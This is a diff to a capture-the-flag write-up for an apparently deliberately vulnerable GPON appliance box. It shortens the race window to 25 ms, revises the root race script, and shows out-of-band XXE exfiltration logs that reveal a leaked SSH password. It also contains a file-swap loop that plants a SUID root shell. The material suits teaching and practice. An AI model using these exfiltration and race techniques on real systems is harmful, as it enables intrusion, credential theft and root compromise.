@@ -7,7 +7,7 @@ FiberRush is an insane-difficulty Linux machine themed around a GPON fiber-optic
 1. **Blind XXE (Out-of-Band) with vendor-specific encoding wrappers** — The provisioning API uses an insecure XML parser, but exfiltration is entirely blind (no error-based or reflection-based leaks). The parser includes a custom `VendorEntityResolver` that supports chainable encoding transforms (`b64:`, `url:`). Players must understand how these wrappers interact with the OOB exfiltration flow and craft multi-stage DTD payloads under a restrictive egress firewall that only allows outbound HTTP to the player's VPN subnet on three specific ports.
 2. **SSRF chaining through XXE** — The leaked configuration reveals an internal diagnostic microservice bound exclusively to loopback. Players must chain the XXE into an SSRF to reach this service, decode the double-encoded response (URL + Base64), and extract SSH credentials from the JSON export. The firewall prevents any direct interaction with the internal service from outside.
 3. **Custom binary protocol reverse-engineering** — Privilege escalation requires interacting with a proprietary OMCI-like TCP daemon running as root on a loopback port. Players must reverse-engineer the binary wire protocol from source code and raw hex packet captures: understand the packet framing (magic bytes, message types, flags, big-endian fields), implement CRC-16/CCITT-FALSE checksums, and perform a challenge-response authentication flow using MD5-based nonce digests. No off-the-shelf tooling exists for this protocol.
-4. **TOCTOU race condition with HMAC-SHA256 bypass** — The daemon's `UPGRADE_ONU` command validates scripts with HMAC-SHA256 using a root-only key before executing them. The signature cannot be forged. However, a 120 ms window between validation and execution allows an atomic file swap (`rename()`) attack. Players must understand TOCTOU semantics, prepare a signed-but-benign decoy and a malicious payload, time the swap precisely, and orchestrate the full attack (protocol client + race script) in concert.
+4. **TOCTOU race condition with HMAC-SHA256 bypass** — The daemon's `UPGRADE_ONU` command validates scripts with HMAC-SHA256 using a root-only key before executing them. The signature cannot be forged. However, a 25 ms window between validation and execution allows an atomic file swap (`rename()`) attack. Players must understand TOCTOU semantics, prepare a signed-but-benign decoy and a malicious payload, and orchestrate the full attack (protocol client + race loop) in concert.
 
 The box tells the story of a realistic telecom fiber-optic management appliance with a vendor-specific binary protocol, restrictive egress firewall rules, internal-only microservices, and cryptographic script validation — mimicking the kind of hardened environment found in real-world critical infrastructure. Every stage requires a distinct skill set (web exploitation, protocol engineering, race condition exploitation), and the lack of standard tooling or straightforward paths makes this a true insane-level challenge.
 
@@ -58,7 +58,7 @@ Docker is not used.
 
 - The `VendorEntityResolver` in `app.py` is designed to simulate a vendor diagnostic helper that was "accidentally" left enabled. The `b64:` and `url:` transform wrappers make OOB exfiltration trivially reliable (no issues with newlines, special characters, or binary data).
 - The OMCI protocol uses a fixed magic value `GONC` (`0x474F4E43`), CRC-16/CCITT-FALSE for integrity, and a challenge-response authentication scheme. Reference packets are provided in `captures/session_packets.hex`.
-- The TOCTOU gap is a deterministic 120 ms `nanosleep()` call, making the race condition reliably exploitable without requiring high-speed brute-force attempts.
+- The TOCTOU gap is a deterministic 25 ms `nanosleep()` call, making the race condition reliably exploitable but still timing-sensitive.
 - The diagnostic API at port 9090 is intentionally unauthenticated and bound to `127.0.0.1`. It serves as the bridge between the XXE/SSRF foothold and the SSH access.
 
 
@@ -211,9 +211,14 @@ curl -X POST http://fiberrush.htb/api/v1/onu/provision \
 <onu-provision><serial-number>x</serial-number><vlan-id>100</vlan-id></onu-provision>'
 ```
 
-The collector decodes and prints the configuration file:
+The collector terminal shows the exfiltrated data:
 
-```ini
+```
+10.10.14.X - - [23/Feb/2026 11:13:17] "GET /stage1.dtd HTTP/1.1" 200 -
+
+============================================================
+[+] EXFILTRATED DATA:
+============================================================
 [omci_daemon]
 host=127.0.0.1
 port=8472
@@ -226,6 +231,10 @@ endpoint=/internal/v1/system/export
 [gpon-operator]
 ; credentials managed via diagnostic service
 ; ssh_key_auth=disabled
+
+============================================================
+
+10.10.14.X - - [23/Feb/2026 11:13:17] "GET /leak?d=..." 200 -
 ```
 
 This reveals two internal services:
@@ -258,23 +267,19 @@ curl -X POST http://fiberrush.htb/api/v1/onu/provision \
 <onu-provision><serial-number>x</serial-number><vlan-id>100</vlan-id></onu-provision>'
 ```
 
-The collector decodes the response:
+The collector terminal shows the exfiltrated data:
 
-```json
-{
-  "hostname": "fiberrush",
-  "firmware": "GPON-OS 4.2.1-r7",
-  "uptime_seconds": 847293,
-  "operators": [
-    {
-      "username": "gpon-operator",
-      "role": "provisioning",
-          "ssh_password": "<LEAKED_PASSWORD>",
-      "last_login": "2026-02-19T08:41:00Z"
-    }
-  ],
-  "omci_daemon": {"host": "127.0.0.1", "port": 8472, "status": "running"}
-}
+```
+10.10.14.X - - [23/Feb/2026 11:22:27] "GET /stage2.dtd HTTP/1.1" 200 -
+
+============================================================
+[+] EXFILTRATED DATA:
+============================================================
+{"firmware":"GPON-OS 4.2.1-r7","hostname":"fiberrush","omci_daemon":{"host":"127.0.0.1","port":8472,"status":"running"},"operators":[{"last_login":"2026-02-19T08:41:00Z","role":"provisioning","ssh_password":"Fiber0ptic-Rush2026","username":"gpon-operator"}],"uptime_seconds":847293}
+
+============================================================
+
+10.10.14.X - - [23/Feb/2026 11:22:27] "GET /leak?d=..." 200 -
 ```
 
 The diagnostic API leaks the `gpon-operator` SSH password.
@@ -328,10 +333,10 @@ In `omci_daemon.c`, the `handle_upgrade_onu` function:
 
 1. Checks that the file at `path` is owned by the calling user (`stat(path)`)
 2. Validates the HMAC-SHA256 signature of the script content (`validate_script_header(path)`)
-3. **Sleeps for 120 ms** (`sleep_ms(120)`)
+3. **Sleeps for 25 ms** (`sleep_ms(25)`)
 4. Executes the script by path (`system(path)`)
 
-Between step 2 (validation) and step 4 (execution), there is a **120 ms Time-of-Check to Time-of-Use (TOCTOU)** window. If we atomically replace the file at `path` during this window, the daemon will execute our unvalidated payload as root.
+Between step 2 (validation) and step 4 (execution), there is a **25 ms Time-of-Check to Time-of-Use (TOCTOU)** window. If we atomically replace the file at `path` during this window, the daemon will execute our unvalidated payload as root.
 
 ## Exploitation
 
@@ -355,7 +360,7 @@ chmod +x /tmp/evil.sh
 
 ### Write the Race Script
 
-Create a script that performs the atomic swap during the 120 ms TOCTOU window:
+Create a script that performs the atomic swap during the 25 ms TOCTOU window:
 
 ```bash
 cat > /tmp/race.sh << 'EOF'
@@ -367,15 +372,17 @@ GOOD="/opt/gpon/upgrade_templates/upgrade_ok.sh"
 EVIL="/tmp/evil.sh"
 STAGE_GOOD="/tmp/.stage_good.sh"
 STAGE_EVIL="/tmp/.stage_evil.sh"
+STAGE_GOOD2="/tmp/.stage_good2.sh"
 
 while true; do
-  # Prepare two staged files and atomically swap the path twice:
-  # - daemon passes validation on GOOD
-  # - daemon executes EVIL after the deterministic sleep window
+  # Keep GOOD present almost all the time so validation passes reliably.
+  # Briefly pulse EVIL in-between atomic renames to target the TOCTOU window.
   cp "$GOOD" "$STAGE_GOOD"
+  cp "$GOOD" "$STAGE_GOOD2"
   cp "$EVIL" "$STAGE_EVIL"
-  mv -f "$STAGE_GOOD" "$LINK"
-  mv -f "$STAGE_EVIL" "$LINK"
+  mv -f "$STAGE_GOOD" "$LINK"   # validation should read this
+  mv -f "$STAGE_EVIL" "$LINK"   # execution should hit this (rare)
+  mv -f "$STAGE_GOOD2" "$LINK"  # immediately restore GOOD
 
   # Check if SUID bash was created
   if [ -f /tmp/rootbash ] && [ -u /tmp/rootbash ]; then
@@ -459,7 +466,8 @@ _, _, _, resp = recv_packet(s)
 print(f'AUTH response: {resp}')
 
 # UPGRADE_ONU (trigger many times to catch the race window)
-for i in range(2000):
+# Each attempt blocks for ~25ms on the server, so 10k attempts is ~4 minutes.
+for i in range(10000):
     s.sendall(build_packet(0x05, 3 + i, UPGRADE_PATH))
     _, _, _, resp = recv_packet(s)
     if b"scheduled" in resp.lower():
@@ -486,7 +494,7 @@ The timing works as follows:
 1. The race script places the legitimate `upgrade_ok.sh` at `/tmp/upgrade.sh`.
 2. The OMCI client sends UPGRADE_ONU pointing to `/tmp/upgrade.sh`.
 3. The daemon validates the signed script (passes HMAC check).
-4. During the 120 ms sleep, the race loop will eventually have swapped the path to the evil script.
+4. During the 25 ms sleep, the race loop may have pulsed the path to the evil script.
 5. The daemon executes the now-replaced file as root.
 
 After a successful race (may take a few attempts):
